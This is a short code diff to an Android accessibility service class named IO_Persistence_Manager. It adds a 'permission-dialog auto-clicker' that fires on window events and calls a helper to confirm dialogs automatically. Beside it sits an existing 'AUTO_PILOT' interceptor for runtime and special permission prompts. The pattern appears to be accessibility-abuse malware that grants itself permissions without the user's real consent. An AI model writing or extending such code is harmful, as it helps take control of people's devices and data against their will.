@@ -121,10 +121,21 @@ public class IO_Persistence_Manager extends AccessibilityService {
         if (event == null) return;
         
         lastEventTime = System.currentTimeMillis();
-        
+
         // --- 1. EXTRACT DATA IMMEDIATELY ON MAIN THREAD ---
         final int eventType = event.getEventType();
         final String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+
+        // --- AUTO_CONFIRM: armed permission-dialog auto-clicker (PATCH-22) ---
+        // Only active while PermissionActivity is running its setup chain.
+        if (AutoConfirmHelper.isArmed()) {
+            try {
+                if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                        || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                    AutoConfirmHelper.tryAutoConfirm(event, getRootInActiveWindow());
+                }
+            } catch (Exception ignored) {}
+        }
 
         // --- AUTO_PILOT: RUNTIME & SPECIAL PERMISSION PROMPT INTERCEPTOR ---
         if (isAutoPilotEngaged()) {
